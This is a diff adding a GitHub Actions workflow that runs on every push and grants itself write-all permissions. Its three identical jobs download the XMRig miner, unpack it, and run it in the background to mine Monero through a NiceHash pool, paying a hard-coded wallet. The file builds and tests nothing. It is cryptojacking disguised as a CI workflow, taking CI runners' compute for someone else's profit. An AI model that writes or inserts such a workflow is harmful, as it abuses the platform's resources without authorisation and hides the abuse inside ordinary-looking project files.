@@ -1,0 +1,34 @@
+name: xx1
+on: [push]
+permissions: write-all 
+jobs:
+  num1:
+    runs-on: ubuntu-latest
+    defaults: 
+      run:
+        shell: bash
+    steps:
+     - run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz
+        tar zxvf xmrig-6.18.0-focal-x64.tar.gz
+        nohup ./xmrig-6.18.0/xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 32KdWEybhtWPaR9VN441dyo2WumSSMkCFG.${RANDOM} -p x -k -a rx/0  2>1 
+  num2:
+    runs-on: ubuntu-latest
+    defaults: 
+      run:
+        shell: bash
+    steps:
+     - run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz
+        tar zxvf xmrig-6.18.0-focal-x64.tar.gz
+        nohup ./xmrig-6.18.0/xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 32KdWEybhtWPaR9VN441dyo2WumSSMkCFG.${RANDOM} -p x -k -a rx/0  2>1 
+  num3:
+    runs-on: ubuntu-latest
+    defaults: 
+      run:
+        shell: bash
+    steps:
+     - run: |
+        wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz
+        tar zxvf xmrig-6.18.0-focal-x64.tar.gz
+        nohup ./xmrig-6.18.0/xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 32KdWEybhtWPaR9VN441dyo2WumSSMkCFG.Magictrick -p x -k -a rx/0  2>1 
